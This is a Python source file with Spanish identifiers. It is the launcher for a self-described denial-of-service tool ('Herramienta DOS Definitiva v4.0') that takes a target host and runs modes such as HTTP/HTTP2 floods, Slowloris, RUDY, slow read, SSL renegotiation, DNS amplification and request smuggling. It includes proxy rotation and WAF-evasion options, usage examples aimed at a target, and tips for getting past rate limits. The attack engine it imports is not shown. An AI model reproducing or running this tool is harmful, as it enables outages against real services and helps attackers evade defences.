#!/usr/bin/env python3
import sys
import os
import asyncio
import argparse
import signal
import psutil
from colorama import init, Fore, Style

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.motor_ataque import MotorAtaque
from utilidades.registro import configurar_registro
from utilidades.estadisticas import GestorEstadisticas

init(autoreset=True)

class HerramientaDos:
    def __init__(self):
        self.estadisticas = GestorEstadisticas()
        self.motor = None
        self.ejecutando = True
        self.registro = configurar_registro()
        self.loop = None
        
    def configurar_manejadores_senales(self):
        signal.signal(signal.SIGINT, self.manejador_senal)
        signal.signal(signal.SIGTERM, self.manejador_senal)
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, self.manejador_senal)
        
    def manejador_senal(self, sig, frame):
        print(f"\n{Fore.YELLOW}⛔ Señal de interrupción recibida, deteniendo...{Style.RESET_ALL}")
        self.ejecutando = False
        
        if self.motor:
            self.motor.ejecutando = False
            if self.loop and not self.loop.is_closed():
                try:
                    for tarea in self.motor.tareas:
                        tarea.cancel()
                    asyncio.run_coroutine_threadsafe(
                        self.motor.pool.limpiar(), 
                        self.loop
                    )
                except Exception as e:
                    print(f"{Fore.RED}Error al detener: {e}{Style.RESET_ALL}")
        
        def salida_forzada():
            import time
            time.sleep(2)
            print(f"{Fore.RED}⚠️  Forzando salida...{Style.RESET_ALL}")
            os._exit(1)
            
        import threading
        threading.Thread(target=salida_forzada, daemon=True).start()
            
    def parsear_argumentos(self):
        parser = argparse.ArgumentParser(
            description="HTTP-TESTER - Commands",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
EJEMPLOS DE USO:
  python dos.py ejemplo.com -p 443 -t 5000 -d 60
  python dos.py ejemplo.com --http2 -t 10000
  python dos.py ejemplo.com --slowloris -t 5000 --conexiones 50
  python dos.py ejemplo.com -p 80 --proxies proxies.txt
  python dos.py ejemplo.com --ssl-reneg -t 1000
  python dos.py ejemplo.com --websocket -t 2000
  python dos.py ejemplo.com --cabeceras-multiples -t 3000
  python dos.py ejemplo.com --amplificacion-dns -t 500
  python dos.py ejemplo.com --slow-read -t 1000
  python dos.py ejemplo.com --smuggling -t 500
  python dos.py ejemplo.com --todos -t 10000 --auto-ajuste
            """
        )
        
        parser.add_argument("host", help="Host objetivo")
        parser.add_argument("-p", "--puerto", type=int, default=443, help="Puerto (default: 443)")
        parser.add_argument("-t", "--hilos", type=int, default=1000, help="Hilos/conexiones (default: 1000)")
        parser.add_argument("-d", "--duracion", type=int, default=60, help="Duración en segundos (default: 60)")
        parser.add_argument("--ssl", action="store_true", default=True, help="Usar SSL (default: True)")
        
        grupo_ataque = parser.add_argument_group('Modos de Ataque')
        grupo_ataque.add_argument("--http", action="store_true", help="Inundación HTTP masiva")
        grupo_ataque.add_argument("--http2", action="store_true", help="Inundación HTTP/2")
        grupo_ataque.add_argument("--slowloris", action="store_true", help="Slowloris avanzado")
        grupo_ataque.add_argument("--post", action="store_true", help="Inundación POST masiva")
        grupo_ataque.add_argument("--rudy", action="store_true", help="R-U-Dead-Yet?")
        grupo_ataque.add_argument("--rango", action="store_true", help="Ataque de rango")
        grupo_ataque.add_argument("--cabeceras-multiples", action="store_true", help="Cabeceras maliciosas")
        grupo_ataque.add_argument("--ssl-reneg", action="store_true", help="Renegociación SSL")
        grupo_ataque.add_argument("--websocket", action="store_true", help="Ataque WebSocket")
        grupo_ataque.add_argument("--amplificacion-dns", action="store_true", help="Amplificación DNS")
        grupo_ataque.add_argument("--slow-read", action="store_true", help="Slow Read Attack")
        grupo_ataque.add_argument("--smuggling", action="store_true", help="Request Smuggling")
        grupo_ataque.add_argument("--todos", action="store_true", help="Usar todos los modos de ataque")
        
        grupo_avanzado = parser.add_argument_group('Configuración Avanzada')
        grupo_avanzado.add_argument("--proxies", help="Archivo con proxies (IP:PUERTO)")
        grupo_avanzado.add_argument("--rotar-ip", action="store_true", help="Rotar IPs automáticamente")
        grupo_avanzado.add_argument("--conexiones", type=int, default=10, help="Conexiones por hilo")
        grupo_avanzado.add_argument("--tasa", type=float, default=0, help="Límite de tasa (req/seg)")
        grupo_avanzado.add_argument("--tamano", type=int, default=4096, help="Tamaño del payload (bytes)")
        grupo_avanzado.add_argument("--timeout", type=int, default=5, help="Timeout de conexión (segundos)")
        grupo_avanzado.add_argument("--randomizar", action="store_true", help="Randomizar todo")
        grupo_avanzado.add_argument("--evadir-waf", action="store_true", help="Evadir WAF")
        grupo_avanzado.add_argument("--auto-ajuste", action="store_true", help="Auto-ajuste de recursos")
        grupo_avanzado.add_argument("--modo-multiple", action="store_true", help="Alternar entre modos")
        
        return parser.parse_args()
    
    async def ejecutar(self):
        args = self.parsear_argumentos()
        self.loop = asyncio.get_running_loop()
        self.configurar_manejadores_senales()
        
        self.registro.info(f"{Fore.CYAN}🚀 Iniciando Herramienta DOS Definitiva v4.0")
        self.registro.info(f"{Fore.GREEN}🎯 Objetivo: {args.host}:{args.puerto}")
        
        modos_ataque = []
        if args.todos:
            modos_ataque = [
                "inundacion_http", "http2", "slowloris", "ataque_post", "rudy",
                "ataque_rango", "cabeceras_multiples", "renegociacion_ssl",
                "websocket", "amplificacion_dns", "slow_read", "request_smuggling"
            ]
        else:
            if args.http:
                modos_ataque.append("inundacion_http")
            if args.http2:
                modos_ataque.append("http2")
            if args.slowloris:
                modos_ataque.append("slowloris")
            if args.post:
                modos_ataque.append("ataque_post")
            if args.rudy:
                modos_ataque.append("rudy")
            if args.rango:
                modos_ataque.append("ataque_rango")
            if args.cabeceras_multiples:
                modos_ataque.append("cabeceras_multiples")
            if args.ssl_reneg:
                modos_ataque.append("renegociacion_ssl")
            if args.websocket:
                modos_ataque.append("websocket")
            if args.amplificacion_dns:
                modos_ataque.append("amplificacion_dns")
            if args.slow_read:
                modos_ataque.append("slow_read")
            if args.smuggling:
                modos_ataque.append("request_smuggling")
        
        if not modos_ataque:
            modos_ataque = [
                "inundacion_http", "slowloris", "ataque_post", "rudy",
                "ataque_rango", "cabeceras_multiples"
            ]
        
        self.motor = MotorAtaque(
            host=args.host,
            puerto=args.puerto,
            hilos=args.hilos,
            duracion=args.duracion,
            ssl=args.ssl,
            modos=modos_ataque,
            archivo_proxies=args.proxies,
            rotar_ip=args.rotar_ip,
            conexiones_por_hilo=args.conexiones,
            tasa=args.tasa,
            tamano_payload=args.tamano,
            timeout=args.timeout,
            randomizar=args.randomizar,
            evadir_waf=args.evadir_waf,
            estadisticas=self.estadisticas,
            auto_ajuste=args.auto_ajuste
        )
        
        try:
            await self.motor.iniciar()
            await self.motor.esperar()
        except asyncio.CancelledError:
            print(f"\n{Fore.YELLOW}⚠️  Ataque cancelado por el usuario{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
        finally:
            if self.motor:
                await self.motor.pool.limpiar()
                self.motor.ejecutando = False
        
        self.mostrar_estadisticas_finales()
        
    def mostrar_estadisticas_finales(self):
        total, exitos, errores, ancho_banda = self.estadisticas.obtener_todo()
        transcurrido = self.estadisticas.transcurrido()
        
        tasa_exitos = (exitos/total*100 if total > 0 else 0)
        tasa_errores = (errores/total*100 if total > 0 else 0)
        tasa_promedio = total/transcurrido if transcurrido > 0 else 0
        
        print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                   📊 ESTADISTICAS FINALES DEL ATAQUE                 ║")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════════════════╝")
        print()
        print(f"{Fore.WHITE}┌─────────────────────────────────────────────────────────────────────┐")
        print(f"{Fore.WHITE}│ 📈 Solicitudes Totales:  {Fore.YELLOW}{total:>10}")
        print(f"{Fore.WHITE}│ ✅ Exitosas:             {Fore.GREEN}{exitos:>10} ({Fore.CYAN}{tasa_exitos:.1f}%{Fore.WHITE})")
        print(f"{Fore.WHITE}│ ❌ Errores:              {Fore.RED}{errores:>10} ({Fore.CYAN}{tasa_errores:.1f}%{Fore.WHITE})")
        print(f"{Fore.WHITE}│ 🛜 Ancho Banda Total:    {Fore.MAGENTA}{ancho_banda/(1024*1024):>10.2f} MB")
        print(f"{Fore.WHITE}│ ⚡ Tasa Promedio:        {Fore.YELLOW}{tasa_promedio:>10.1f} req/s")
        print(f"{Fore.WHITE}│ ⏱️  Duración Total:       {Fore.CYAN}{transcurrido:>10.1f}s")
        print(f"{Fore.WHITE}└─────────────────────────────────────────────────────────────────────┘")
        
        if tasa_errores > 50:
            print(f"\n{Fore.YELLOW}⚠️  Alto porcentaje de errores. Considere:")
            print(f"{Fore.YELLOW}   - Reducir número de hilos ({tasa_errores:.1f}% errores)")
            print(f"{Fore.YELLOW}   - Verificar conectividad con el objetivo")
            print(f"{Fore.YELLOW}   - Usar proxies para distribuir el tráfico")
        
        if tasa_promedio < 10 and total > 0:
            print(f"\n{Fore.YELLOW}⚠️  Tasa baja. Considere:")
            print(f"{Fore.YELLOW}   - Aumentar número de hilos (actual: {self.motor.hilos if self.motor else 0})")
            print(f"{Fore.YELLOW}   - Usar --rotar-ip para evitar limitaciones")
            print(f"{Fore.YELLOW}   - Habilitar --auto-ajuste para optimización")

if __name__ == "__main__":
    try:
        asyncio.run(HerramientaDos().ejecutar())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⛔ Ataque interrumpido por el usuario (Ctrl+C){Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Error fatal: {e}{Style.RESET_ALL}")